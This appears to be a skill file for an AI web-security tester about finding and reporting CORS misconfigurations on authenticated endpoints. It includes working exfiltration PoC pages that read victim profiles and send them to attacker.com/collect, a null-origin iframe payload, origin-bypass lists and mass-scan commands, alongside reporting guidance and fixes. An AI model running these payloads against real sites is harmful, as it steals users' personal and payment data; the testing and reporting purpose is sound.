---
name: cors_misconfiguration
description: CORS misconfiguration testing — SENSITIVE ENDPOINTS ONLY — with mandatory cross-origin data exfiltration proof, strict false-positive rejection for public endpoints, and real impact demonstration
---

# CORS Misconfiguration

CORS (Cross-Origin Resource Sharing) misconfiguration allows attacker-controlled origins to read sensitive responses from authenticated APIs. A CORS misconfiguration is only a security vulnerability if it can be exploited to steal sensitive data. CORS issues on public/unauthenticated endpoints are NOT security vulnerabilities.

---

## CRITICAL RULE — READ BEFORE TESTING ANYTHING

**CORS is ONLY worth testing on endpoints that:**
1. Return sensitive data (PII, authentication tokens, financial records, private messages, health data, API keys, etc.)
2. Require authentication (have an active user session or token)
3. Support `Access-Control-Allow-Credentials: true` (without this, session cookies can't be sent cross-origin)

**CORS is NOT a vulnerability on:**
- Public/unauthenticated endpoints (no session → no sensitive data to steal)
- Login and logout endpoints (these endpoints don't return user-specific sensitive data)
- Registration endpoints
- Static file servers (CSS, JS, images)
- Endpoints returning only success/failure boolean responses
- Endpoints already protected by SameSite=Strict cookies (no cross-origin cookie sending)

**Reporting CORS on a public endpoint is a FALSE POSITIVE. Do not do it.**

---

## Real Impact Gate — Answer Before Reporting

Before reporting any CORS finding, explicitly confirm ALL of these:

1. **Is this endpoint returning sensitive data?**
   - YES: email, phone, address, payment info, API tokens, private messages, health data, admin data
   - NO: public content, success/failure responses, static assets → DO NOT REPORT

2. **Is the endpoint authenticated?**
   - YES: requires Cookie or Authorization header → proceed
   - NO: accessible without any auth → DO NOT REPORT (no user data to steal)

3. **Is Access-Control-Allow-Credentials: true?**
   - YES → credentials are sent cross-origin → proceed
   - NO and no other auth mechanism → cross-origin requests won't include cookies → very limited impact (only if using tokens in URL params)

4. **Have you demonstrated ACTUAL data exfiltration?**
   - Required: run the PoC HTML page from an attacker origin and capture the actual sensitive data in the attacker's server log
   - NOT sufficient: just showing the response headers
   - NOT sufficient: showing the reflected Origin header without demonstrating data theft

5. **What is the real business impact?**
   - Which specific sensitive data type can be stolen?
   - Which users are affected?
   - What can an attacker do with the stolen data?

---

## Sensitive Endpoint Identification — FIRST STEP

Before testing any CORS configuration, identify which endpoints return sensitive data.

**Automated sensitive endpoint detection**:
```python
import requests, json

def find_sensitive_endpoints(all_authenticated_endpoints, user_session_cookie):
    """Identify which endpoints return sensitive data worth testing CORS on"""
    
    SENSITIVE_PATTERNS = [
        "email", "phone", "password", "address", "credit", "card", "payment",
        "invoice", "billing", "ssn", "dob", "birth", "health", "medical",
        "token", "api_key", "secret", "private", "message", "inbox",
        "financial", "bank", "account_number", "routing", "salary",
        "admin", "role", "permission", "access_level"
    ]
    
    sensitive_endpoints = []
    
    for endpoint in all_authenticated_endpoints:
        try:
            resp = requests.get(
                endpoint,
                cookies={"session": user_session_cookie},
                headers={"Accept": "application/json"},
                timeout=10
            )
            
            if resp.status_code == 200:
                body_lower = resp.text.lower()
                matched_fields = [p for p in SENSITIVE_PATTERNS if p in body_lower]
                
                if matched_fields:
                    sensitive_endpoints.append({
                        "url": endpoint,
                        "sensitive_fields": matched_fields,
                        "response_preview": resp.text[:200]
                    })
        except Exception as e:
            continue
    
    return sensitive_endpoints

# Only test CORS on the endpoints returned by this function
sensitive_targets = find_sensitive_endpoints(all_endpoints, user_a_cookie)
print(f"Sensitive endpoints to test CORS on: {len(sensitive_targets)}")
```

---

## CORS Testing Methodology

### Step 1: Check Current CORS Configuration

For each sensitive endpoint:
```bash
# Test origin reflection
curl -s -I \
  -H "Origin: https://attacker.com" \
  -H "Cookie: session=USER_SESSION" \
  "https://target.com/api/user/profile" | grep -i "access-control"
```

Analyze the response:
- `Access-Control-Allow-Origin: https://attacker.com` → origin is reflected (suspicious)
- `Access-Control-Allow-Origin: *` → wildcard (cannot be used with credentials, but check for tokens in URL)
- `Access-Control-Allow-Credentials: true` → credentials will be sent cross-origin

### Step 2: Test Misconfiguration Variants

```python
import requests

def test_cors_variants(endpoint, session_cookie):
    """Test multiple CORS bypass techniques on a sensitive endpoint"""
    
    test_cases = [
        # Basic attacker origin reflection
        {"origin": "https://attacker.com", "description": "Basic attacker origin"},
        # Null origin (from sandboxed iframe or data: URI)
        {"origin": "null", "description": "Null origin (sandboxed iframe)"},
        # Subdomain of target (if one is compromised, CORS bypass via subdomain trust)
        {"origin": "https://sub.target.com", "description": "Subdomain trust"},
        {"origin": "https://attacker.target.com", "description": "Prefix bypass (attackertarget.com)"},
        {"origin": "https://target.com.attacker.com", "description": "Suffix bypass"},
        # HTTP vs HTTPS bypass
        {"origin": "http://target.com", "description": "HTTP downgrade"},
        # Case variation
        {"origin": "https://TARGET.COM", "description": "Case variation"},
    ]
    
    results = []
    for test in test_cases:
        resp = requests.get(
            endpoint,
            headers={
                "Origin": test["origin"],
                "Cookie": f"session={session_cookie}"
            }
        )
        
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "")
        
        if acao == test["origin"] or acao == "*":
            exploitable = (acao == test["origin"] and acac.lower() == "true") or \
                         (acao == "*" and not "Authorization" in ["Cookie"])  # wildcard with tokens in URL
            
            results.append({
                "origin": test["origin"],
                "description": test["description"],
                "ACAO": acao,
                "ACAC": acac,
                "exploitable": exploitable,
                "response_preview": resp.text[:200]
            })
    
    return results
```

### Step 3: Demonstrate Actual Data Exfiltration (MANDATORY)

A CORS misconfiguration is only exploitable if you can actually steal data from the victim's session. Demonstrate this with a working PoC:

**Attacker's malicious page (attacker.com/cors_poc.html)**:
```html
<!DOCTYPE html>
<html>
<head><title>CORS Exfiltration PoC</title></head>
<body>
<script>
// This page simulates an attacker's website that the victim visits
// It silently steals the victim's data from target.com

async function stealData() {
    try {
        // Make cross-origin request WITH credentials (cookies are sent automatically)
        const response = await fetch('https://target.com/api/user/profile', {
            method: 'GET',
            credentials: 'include',  // sends victim's cookies to target.com
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        // If CORS misconfiguration exists, we can read the response
        const data = await response.json();
        
        // Exfiltrate the stolen data to attacker's server
        await fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify({
                stolen_data: data,
                victim_url: document.referrer,
                timestamp: new Date().toISOString()
            })
        });
        
        document.body.innerHTML = '<p>Data exfiltrated: ' + JSON.stringify(data) + '</p>';
    } catch(e) {
        document.body.innerHTML = '<p>CORS blocked: ' + e.message + '</p>';
    }
}

stealData();
</script>
</body>
</html>
```

**Test execution**:
```python
from playwright.sync_api import sync_playwright

def demonstrate_cors_exfiltration(victim_session_cookie, poc_page_url, target_endpoint):
    """Demonstrate actual data exfiltration via CORS misconfiguration"""
    
    with sync_playwright() as p:
        browser = p.chromium.launch()
        context = browser.new_context()
        
        # Set victim's session cookie on target domain
        context.add_cookies([{
            "name": "session",
            "value": victim_session_cookie,
            "domain": "target.com",
            "path": "/"
        }])
        
        # Capture all network requests (to see exfiltration to attacker.com)
        stolen_data = []
        
        def capture_request(request):
            if "attacker.com/collect" in request.url:
                # This is the exfiltration request — capture the stolen data
                stolen_data.append(request.post_data)
        
        page = context.new_page()
        page.on("request", capture_request)
        
        # Navigate to attacker's page (simulating victim clicking malicious link)
        page.goto(poc_page_url)
        page.wait_for_timeout(3000)
        
        browser.close()
        
        if stolen_data:
            print(f"CORS EXFILTRATION CONFIRMED!")
            print(f"Stolen data: {stolen_data}")
            return True, stolen_data
        else:
            print("CORS exfiltration failed — likely blocked by browser")
            return False, None
```

---

## CORS Misconfiguration Types

### Type 1: Reflected Origin with Credentials (Most Critical)
```
Request:  Origin: https://attacker.com
Response: Access-Control-Allow-Origin: https://attacker.com
          Access-Control-Allow-Credentials: true

Impact: Attacker's website can read ANY response from the target API using the victim's session
Severity: Critical (if sensitive data returned) / High (if less sensitive)
```

### Type 2: Null Origin
```
Request:  Origin: null
Response: Access-Control-Allow-Origin: null
          Access-Control-Allow-Credentials: true

Impact: Can be triggered from sandboxed iframes or data: URIs
PoC: <iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://target.com/api/profile',{credentials:'include'}).then(r=>r.json()).then(d=>top.postMessage(d,'*'))</script>">
Severity: High
```

### Type 3: Regex Bypass / Weak Validation
```
Intended: Allow only target.com and subdomains
Vulnerable regex: /target\.com/  (matches attackertarget.com)

Test with:
  https://attackertarget.com  (prefix bypass)
  https://target.com.attacker.com  (suffix bypass)
  https://target.com-attacker.com  (dash bypass)
  https://xtarget.com  (prefix variation)
```

### Type 4: Trusted Subdomain (Subdomain Takeover Chain)
```
If CORS trusts *.target.com and one subdomain can be taken over:
  https://old-subdomain.target.com → subdomain takeover
  Then use old-subdomain.target.com to make CORS requests

This chains CORS with subdomain takeover → Critical severity
```

---

## Severity Classification

| Condition | Severity |
|-----------|----------|
| Sensitive data (PII/tokens/financial) + reflected origin + credentials:true | Critical |
| Less sensitive data + reflected origin + credentials:true | High |
| Null origin + sensitive data + credentials:true | High |
| Weak regex bypass + sensitive data + credentials:true | High |
| Subdomain bypass if subdomains are at risk of takeover | High |
| Any CORS issue on unauthenticated/public endpoint | NOT a vulnerability — DO NOT REPORT |
| Any CORS issue where credentials:false AND no auth token in URL | Low/Info only |
| Wildcard (*) without credentials:true (browser blocks cookie sending) | Low (check for API key auth in URL) |

---

## UI Steps — Required in Every Report

```
CORS EXPLOITATION UI REPRODUCTION STEPS:

PRE-REQUISITES:
- Victim user logged into target.com in their browser
- Attacker hosts a malicious page at attacker.com/cors_poc.html

STEP-BY-STEP ATTACK FLOW:

Step 1: Victim (User A) is logged into https://target.com
        Screenshot: victim's authenticated session showing profile data

Step 2: Attacker identifies that https://target.com/api/user/profile returns sensitive data:
        Navigate to https://target.com/api/user/profile
        Observe response contains: {"email":"victim@email.com","phone":"555-1234","address":"123 Main St"}
        Screenshot: sensitive data in API response

Step 3: Attacker tests CORS on this sensitive endpoint:
        Open terminal → run:
        curl -s -I -H "Origin: https://attacker.com" -H "Cookie: session=USER_A_SESSION" \
          "https://target.com/api/user/profile"
        Observe: Access-Control-Allow-Origin: https://attacker.com
                 Access-Control-Allow-Credentials: true
        Screenshot: CORS headers in curl response

Step 4: Attacker hosts the CORS PoC page at https://attacker.com/cors_poc.html
        (see Working PoC section for complete HTML code)

Step 5: Attacker tricks victim into visiting https://attacker.com/cors_poc.html
        (via phishing email, social media, malicious advertisement, etc.)

Step 6: When victim visits the page, the attacker's JavaScript automatically:
        a. Sends a cross-origin request to https://target.com/api/user/profile
        b. Victim's browser includes their session cookie (credentials:'include')
        c. Target.com responds with victim's profile data (CORS headers allow attacker's origin)
        d. Attacker's JavaScript can read the response and sends it to attacker's server
        Screenshot: Attacker's collection server log showing received victim's data:
                   {"email":"victim@email.com","phone":"555-1234","address":"123 Main St"}

Step 7: Attacker now has victim's personal information without any action from the victim
        (victim only had to visit attacker.com/cors_poc.html)
```

---

## Complete Report Format

**TITLE**: CORS Misconfiguration on Authenticated User Profile API — Cross-Origin Data Theft of PII

**SEVERITY**: Critical

**RAW HTTP REQUEST**:
```
GET /api/user/profile HTTP/1.1
Host: target.com
Origin: https://attacker.com
Cookie: session=VICTIM_SESSION_TOKEN
Accept: application/json
```

**RAW HTTP RESPONSE**:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com    ← Attacker origin reflected
Access-Control-Allow-Credentials: true               ← Credentials allowed
Content-Type: application/json

{
  "user_id": 12345,
  "email": "victim@company.com",          ← Sensitive PII
  "phone": "+1-555-123-4567",             ← Sensitive PII
  "address": "123 Private Street",        ← Sensitive PII
  "payment_method": "Visa ending 4242"   ← Financial data
}
```

**EXACT LOCATION**:
- Vulnerable endpoint: GET https://target.com/api/user/profile
- Vulnerability: Server reflects any Origin header in ACAO with ACAC:true
- Authentication: Required (endpoint returns 401 without valid session)
- Data sensitivity: PII (email, phone, address) + financial data

**WORKING POC**:
```html
<!-- Host this file at https://attacker.com/cors_poc.html -->
<!DOCTYPE html>
<html>
<script>
fetch('https://target.com/api/user/profile', {credentials:'include'})
  .then(r => r.json())
  .then(data => {
    // Stolen data received! Send to attacker's collection server.
    fetch('https://attacker.com/collect?data=' + btoa(JSON.stringify(data)));
    document.body.innerHTML = 'Stolen: ' + JSON.stringify(data);
  })
  .catch(e => document.body.innerHTML = 'Blocked: ' + e);
</script>
</html>
```

**VALIDATION**:
- Signal 1: curl with `Origin: https://attacker.com` and valid session cookie receives ACAO: attacker.com + ACAC: true, with full JSON response containing victim's PII
- Signal 2: Playwright-driven test with victim's session cookie on attacker.com origin successfully retrieved victim's profile data and exfiltrated it to attacker.com/collect endpoint — confirmed via server log showing received data

**REAL IMPACT**:
Any attacker who tricks an authenticated user into visiting their malicious website (via phishing, social media, malicious ad, XSS on another site) can silently steal the victim's complete profile data without any indication to the victim. The stolen data includes: email address, phone number, home address, and payment card information. The victim only needs to visit the malicious page while logged into target.com — one click is all that's required. This attack is silent, instantaneous, and requires no user interaction beyond visiting the page. At scale, an attacker could use phishing campaigns to steal the PII and payment data of thousands of users simultaneously. This constitutes a serious GDPR violation (unauthorized access to personal data) and PCI-DSS violation (payment data exposure).

**RECOMMENDED FIX**:
1. Primary: Replace origin reflection with an explicit allowlist of trusted origins:
   ```javascript
   const ALLOWED_ORIGINS = ['https://app.target.com', 'https://www.target.com'];
   if (ALLOWED_ORIGINS.includes(req.headers.origin)) {
       res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
   }
   // Never: res.setHeader('Access-Control-Allow-Origin', req.headers.origin) without validation
   ```
2. Secondary: Ensure session cookies have SameSite=Strict attribute — this prevents cookies from being sent on cross-origin requests even if CORS is misconfigured:
   `Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict`
3. Secondary: Never combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` — this is an invalid configuration that browsers reject, but it indicates confused CORS implementation
4. Verification: After fix, confirm that `curl -H "Origin: https://attacker.com"` no longer receives the attacker's origin in ACAO header

---

## False Positive Rejection — Do Not Report These

**Absolute rejections (100% false positive)**:
- CORS misconfiguration on any endpoint that does NOT require authentication
- CORS wildcard (`*`) on any endpoint that uses cookie-based auth with SameSite=Strict
- CORS issue on login, logout, or registration endpoints
- CORS issue where the response body contains no sensitive data
- CORS issue where no cookies or tokens are sent cross-origin (SameSite=Strict blocks this)
- CORS preflight failure that prevents actual requests from succeeding

**Conditional rejections (investigate before reporting)**:
- Subdomain in allowlist: only reportable if that subdomain is demonstrably vulnerable to takeover
- Null origin: only reportable if you demonstrate a working sandboxed iframe PoC that exfiltrates data
- Wildcard with Bearer tokens: only reportable if Bearer token is stored in a location accessible cross-origin (e.g., localStorage, not httpOnly cookies)



## Additional Techniques — ported from WebSkills (cors-test)

Extra `Origin` header values to add to the Step 2 variant array — these target *parser-confusion* validators (regex/split-based allowlists) rather than simple prefix/suffix checks:

```python
parser_confusion_origins = [
    "expected-host.computer",              # suffix-TLD: allowlist regex anchored on "expected-host." but not the TLD
    "foo@evil-host:80@expected-host",      # double-@ userinfo confusion (validator reads last host, browser reads first)
    "foo@evil-host%20@expected-host",      # %20 in userinfo
    "evil-host%09expected-host",           # %09 (tab) treated as delimiter by one parser, literal by the other
    "sub.evil%expected-host.com",          # % breaks naive host parsing
    "evil-host%00.expected-host.com",      # null byte truncation on legacy parsers
    "127.1.1.1:80\\@127.2.2.2:80",         # backslash host confusion
    "https://ß.expected-host.com",         # IDN: ß may normalize to "ss" post-IDNA → allowlist drift
    "https://expected-host。com",           # full-width dot IDN variant
]
# For each: send with the victim session cookie; VULNERABLE if the reflected
# Access-Control-Allow-Origin echoes your attacker-controlled origin AND
# Access-Control-Allow-Credentials: true.
```

**Tooling for scale**
- Single target (Burp): spider the app, then Burp-search responses for `Access-Control`; on each hit inject `Origin: attacker.com` / `Origin: null` / `Origin: attacker.target.com` and check for reflection.
- Mass scan: [CorsMe](https://github.com/Shivangx01b/CorsMe) — `cat live_hosts.txt | ./CorsMe -t 70`. Pipe a normal `subfinder -d target.com | httpx` host list through it to triage which endpoints reflect the origin before manual credential+sensitive-data confirmation.
